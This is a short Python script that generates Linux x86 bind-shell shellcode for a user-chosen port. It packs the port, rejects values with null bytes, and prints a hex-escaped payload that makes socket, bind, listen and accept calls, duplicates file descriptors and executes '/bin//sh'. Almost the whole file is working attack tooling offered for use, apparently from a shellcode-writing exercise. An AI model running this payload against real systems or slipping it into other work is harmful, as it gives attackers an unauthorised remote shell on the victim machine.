#!/usr/bin/env python3
import sys
import struct
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p', "--port")
args = parser.parse_args()

if args.port == None:
    parser.print_help()
    exit()

port = int(args.port)

if port > 65535:
    print("Please enter a valid port number!")
    exit()

if port < 1024:
    print("You'll need to be root to use this port!")

port = struct.pack("!H", port)

port = ("{}".format(''.join('\\x{:02x}'.format(b) for b in port)))

if "\\x00" in port:
    print(" Nulls in selected port!")
    exit()

shellcode = """
\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02
\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x5b\\x31\\xd2\\x52\\x66\\x68%s
\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0
\\x50\\x57\\x89\\xe1\\x43\\x43\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x52
\\x57\\x43\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0
\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f
\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80
""" % (port)

print("Shellcode:")
print(shellcode.replace("\n", ""))
